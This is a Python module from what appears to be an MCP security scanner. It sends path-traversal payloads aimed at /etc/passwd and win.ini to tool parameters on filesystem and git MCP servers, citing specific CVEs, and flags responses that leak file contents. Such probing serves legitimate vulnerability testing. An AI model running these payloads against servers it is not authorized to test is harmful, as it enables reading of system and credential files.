# SPDX-License-Identifier: AGPL-3.0-or-later
"""Path traversal probes for filesystem/git MCP servers.

Targets:
- CVE-2025-68143 (mcp-server-git git_init arbitrary path)
- CVE-2025-68145 (mcp-server-git path traversal)
- filesystem-mcp class path bypass

Argument injection used to live here too and now has its own module. It asks a
different question - whether a value was read as an option rather than as a
path - and it answers it from what the target echoed instead of from a file on
this host. See `arg_bypass.py` (CVE-2025-68144).
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from ..client import McpClient
from ..content import is_tool_error, tool_result_text

_PATH_PAYLOADS = [
    "../../../../etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
]


@dataclass(frozen=True, slots=True)
class TraversalFinding:
    tool: str
    payload: str
    confirmed: bool
    note: str = ""


def probe_path_traversal(client: McpClient) -> list[TraversalFinding]:
    tools = client.list_tools()
    out: list[TraversalFinding] = []
    for tool in tools:
        param_name = _first_path_param(tool.input_schema)
        if not param_name:
            continue
        for payload in _PATH_PAYLOADS:
            resp = client.send("tools/call", {"name": tool.name, "arguments": {param_name: payload}})
            if resp.is_error:
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=False,
                        note=f"server denied: {str(resp.error)[:120]}",
                    )
                )
                continue
            body = tool_result_text(resp.result)
            if is_tool_error(resp.result):
                # Tool-level refusal, which the spec keeps inside a successful
                # response; treated as a denial like a protocol-level one.
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=False,
                        note=f"tool refused: {body[:120]}",
                    )
                )
                continue
            confirmed = "root:" in body or "[fonts]" in body.lower()
            if confirmed:
                out.append(
                    TraversalFinding(
                        tool=tool.name,
                        payload=payload,
                        confirmed=True,
                        note=body[:120],
                    )
                )
            # silent OK responses without sensitive content are dropped
    return out


def _first_path_param(schema: dict[str, Any] | None) -> str | None:
    for k, v in ((schema or {}).get("properties") or {}).items():
        if isinstance(v, dict) and any(t in k.lower() for t in ("path", "file", "uri", "dir")):
            return k
    return None
